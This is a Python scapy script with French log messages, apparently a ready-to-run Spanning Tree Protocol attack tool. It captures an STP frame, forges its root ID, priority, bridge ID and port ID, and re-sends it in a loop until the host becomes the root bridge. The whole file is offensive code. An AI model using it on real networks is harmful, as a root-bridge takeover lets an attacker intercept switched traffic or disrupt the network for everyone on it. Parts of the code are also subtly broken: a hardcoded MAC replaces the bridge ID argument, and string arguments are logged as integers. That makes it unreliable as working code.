import argparse
import logging
from scapy.all import sniff, Ether, STP, sendp, raw

def setup_logging(debug, log_file=None):
    log_level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler() if not log_file else logging.FileHandler(log_file),
        ]
    )

def capture_stp(interface):
    packet = sniff(count=1, iface=interface, filter="stp", timeout=10)
    
    if packet:
        logging.debug("Paquet capturé : %s", packet[0].show())
        return packet[0]
    else:
        logging.error("Aucun paquet STP capturé.")
        return None

def is_root_bridge(packet, expected_rootid):
    rootid = packet[STP].rootid
    if rootid == expected_rootid:
        logging.info("Nous sommes le Root Bridge (rootid : %d).", rootid)
        return True
    else:
        logging.info("Nous ne sommes pas le Root Bridge (rootid : %d).", rootid)
        return False

def modify_and_send_stp(interface, rootid, priority, bridgeid, portid, debug):

    packet = capture_stp(interface)
    
    if not packet or STP not in packet:
        logging.error("La couche STP n'a pas été trouvée dans le paquet.")
        return
    
    logging.debug("Trame avant modification : %s", packet.show())

    logging.info("Modification de la trame...")
    if rootid is not None:
        logging.debug("Changement de rootid à %d", rootid)
        packet[STP].rootid = rootid
    if priority is not None:
        logging.debug("Changement de priorité à %d", priority)
        packet[STP].priority = priority
    if bridgeid is not None:
        logging.debug("Changement de bridgeid à %d", bridgeid)
        packet[STP].bridgeid = raw(b'08:00:27:ad:25:87')
    if portid is not None:
        logging.debug("Changement de portid à %d", portid)
        packet[STP].portid = portid

    logging.debug("Trame après modification : %s", packet.show())

    logging.info("Envoi de la trame modifiée...")
    sendp(packet, iface=interface)
    logging.info("Trame envoyée avec succès")

def main():
    parser = argparse.ArgumentParser(description="Capture, modifie et renvoie une trame STP.")
    parser.add_argument("-i", "--interface", required=True, help="Interface réseau à utiliser pour capturer les trames")
    parser.add_argument("-rid", "--rootid", type=int, help="Valeur personnalisée pour rootid (0-65535)")
    parser.add_argument("-p", "--priority", type=int, help="Valeur personnalisée pour la priorité")
    parser.add_argument("-d", "--debug", action="store_true", help="Activer le mode débogage")
    parser.add_argument("-l", "--log", type=str, help="Fichier de log pour enregistrer les informations")
    parser.add_argument("-bid", "--bridgeid", type=str, help="Valeur personnalisée pour bridgeid")
    parser.add_argument("-pid", "--portid", type=str, help="Valeur personnalisée pour portid")

    args = parser.parse_args()

    setup_logging(args.debug, args.log)

    logging.info("Démarrage du programme STP")

    while True:
        modify_and_send_stp(args.interface, args.rootid, args.priority, args.bridgeid, args.portid, args.debug)
        
        packet = capture_stp(args.interface)
        
        if packet and is_root_bridge(packet, args.rootid):
            logging.info("Le processus a terminé car nous sommes maintenant le Root Bridge.")
            break

if __name__ == "__main__":
    main()
